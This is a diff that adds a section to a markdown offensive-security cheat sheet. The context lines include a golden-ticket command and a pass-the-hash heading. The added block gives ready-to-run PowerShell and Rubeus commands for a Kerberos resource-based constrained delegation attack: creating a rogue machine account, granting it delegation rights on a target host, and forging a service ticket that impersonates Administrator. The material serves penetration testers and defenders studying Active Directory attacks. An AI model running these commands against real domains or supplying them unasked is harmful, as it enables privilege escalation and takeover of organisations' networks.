@@ -302,6 +302,16 @@ kerberos::golden /user:Hitman /domain:DOMAIN /sid:DOMAIN-SID /krbtgt:HASH /ticke
 ```
 
 &nbsp;
+
+**[+] Kerberos Resource-based Constrained Delegation (Need PowerMad and AD modules)**
+
+```powershell
+New-MachineAccount -Domain internal.msp.local -DomainController internal-dc01.internal.msp.local -MachineAccount attacker -Password (ConvertTo-SecureString 'Password123' -AsPlainText -Force) -Verbose
+Set-ADComputer INTERNAL-BATCH -PrincipalsAllowedToDelegateToAccount attacker$ -Verbose
+.\Rubeus.exe s4u /user:attacker$ /rc4:58A478135A93AC3BF058A5EA0E8FDB71 /msdsspn:http/INTERNAL-BATCH /impersonateuser:Administrator /ptt
+```
+
+&nbsp;
 &nbsp;
 
 ## Pass the hash
